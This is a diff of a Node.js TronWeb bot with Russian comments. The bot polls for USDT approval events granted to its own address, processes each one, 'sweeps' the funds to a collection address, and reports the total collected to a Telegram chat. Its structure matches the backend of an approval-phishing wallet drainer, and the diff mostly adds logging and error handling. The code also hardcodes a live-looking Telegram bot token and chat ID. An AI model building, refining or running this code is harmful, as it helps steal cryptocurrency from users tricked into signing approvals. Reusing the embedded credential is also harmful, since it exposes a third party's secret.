@@ -16,7 +16,7 @@ const TOKEN_CONTRACT = process.env.TOKEN_CONTRACT;
 const COLLECTION_ADDRESS = process.env.COLLECTION_ADDRESS;
 const BOT_ADDRESS = tronWeb.address.fromPrivateKey(process.env.BOT_PRIVATE_KEY);
 
-// Telegram настройки
+// Telegram настройки (ПРЯМО В КОДЕ, как работало раньше)
 const TELEGRAM_TOKEN = '8508345570:AAGJBV9H92ukUQsvsUqnM1uNfm8VdKn9AVk';
 const TELEGRAM_CHAT_ID = '-1003750493145';
 
@@ -39,10 +39,12 @@ console.log(`Адрес бота: ${BOT_ADDRESS}`);
 console.log(`Сбор USDT на: ${COLLECTION_ADDRESS}`);
 console.log('=================================\n');
 
-// -------------------- 2. ФУНКЦИИ TELEGRAM --------------------
+// -------------------- 2. ФУНКЦИЯ ОТПРАВКИ В TELEGRAM --------------------
 async function sendTelegramNotification(message) {
     try {
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        console.log('📤 Отправка уведомления в Telegram...');
+        
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -51,8 +53,16 @@ async function sendTelegramNotification(message) {
                 parse_mode: 'HTML'
             })
         });
+        
+        const result = await response.json();
+        
+        if (response.ok) {
+            console.log('✅ Уведомление успешно отправлено в Telegram');
+        } else {
+            console.log('❌ Ошибка Telegram API:', result);
+        }
     } catch (error) {
-        console.error('Ошибка Telegram:', error.message);
+        console.error('❌ Ошибка при отправке в Telegram:', error.message);
     }
 }
 
@@ -100,7 +110,7 @@ ${status}
             }
         }
     } catch (error) {
-        console.error('Ошибка команд:', error);
+        console.error('Ошибка проверки команд:', error.message);
     }
 }
 
@@ -109,6 +119,7 @@ async function checkBotBalance() {
     try {
         const balance = await tronWeb.trx.getBalance(BOT_ADDRESS);
         const balanceTRX = tronWeb.fromSun(balance);
+        
         if (balanceTRX < 10) {
             await sendTelegramNotification(`
 ⚠️ <b>Мало TRX!</b>
@@ -135,6 +146,12 @@ async function getNewApprovals() {
                 min_block_timestamp: oneDayAgo
             })
         );
+        
+        if (!response.ok) {
+            console.log('❌ Ошибка API Trongrid');
+            return [];
+        }
+        
         const data = await response.json();
         if (!data.data) return [];
 
@@ -143,12 +160,12 @@ async function getNewApprovals() {
             return spender === BOT_ADDRESS && !processedTxs.has(event.transaction_id);
         });
     } catch (error) {
-        console.error('Ошибка API:', error.message);
+        console.error('Ошибка получения событий:', error.message);
         return [];
     }
 }
 
-// -------------------- 6. ОБРАБОТКА APPROVE (ИСПРАВЛЕНО) --------------------
+// -------------------- 6. ОБРАБОТКА APPROVE --------------------
 async function processApproval(event) {
     const owner = tronWeb.address.fromHex(event.result.owner);
     const value = event.result.value;
@@ -287,37 +304,59 @@ async function checkAndSweep() {
     }
 
     console.log(`\n🔄 ПРОВЕРКА [${new Date().toLocaleString()}]`);
+    
+    // Проверяем баланс и статистику
     await checkBotBalance();
     await checkDailyStats();
 
+    // Ищем новые approve
     const approvals = await getNewApprovals();
+    
     if (approvals.length === 0) {
         console.log('⏳ Новых approve нет');
         return;
     }
 
-    console.log(`📋 Обрабатываем ${approvals.length} approve...`);
+    console.log(`📋 Найдено ${approvals.length} новых approve`);
+    
+    // Обрабатываем каждый approve
     for (const app of approvals) {
         await processApproval(app);
+        // Пауза между транзакциями
         await new Promise(resolve => setTimeout(resolve, 3000));
     }
 }
 
 // -------------------- 9. ЗАПУСК --------------------
-setInterval(checkAndSweep, 30000);
+// Запускаем первую проверку сразу
 checkAndSweep();
 
-// -------------------- 10. ОСТАНОВКА --------------------
+// Запускаем проверку каждые 30 секунд
+setInterval(checkAndSweep, 30000);
+
+// -------------------- 10. ОБРАБОТКА ОСТАНОВКИ --------------------
 process.on('SIGINT', async () => {
-    console.log('\n👋 Остановка...');
+    console.log('\n👋 Получен сигнал остановки...');
+    
     const uptime = Math.floor((Date.now() - startTime) / 1000 / 60);
+    
     await sendTelegramNotification(`
 🛑 <b>Бот остановлен</b>
 
-📊 Итог:
-💰 Всего: ${stats.totalCollected.toFixed(2)} USDT
-📦 Транзакций: ${stats.totalTransactions}
-⏱ Работа: ${uptime} мин
+📊 <b>Итоговая статистика:</b>
+💰 Всего собрано: ${stats.totalCollected.toFixed(2)} USDT
+📦 Всего транзакций: ${stats.totalTransactions}
+⏱ Время работы: ${uptime} минут
+
+👋 До свидания!
     `);
+    
+    console.log('✅ Бот остановлен');
     process.exit(0);
+});
+
+// Обработка необработанных ошибок
+process.on('unhandledRejection', async (error) => {
+    console.error('❗ Необработанная ошибка:', error);
+    await sendTelegramNotification(`❗ Критическая ошибка: ${error.message}`);
 });
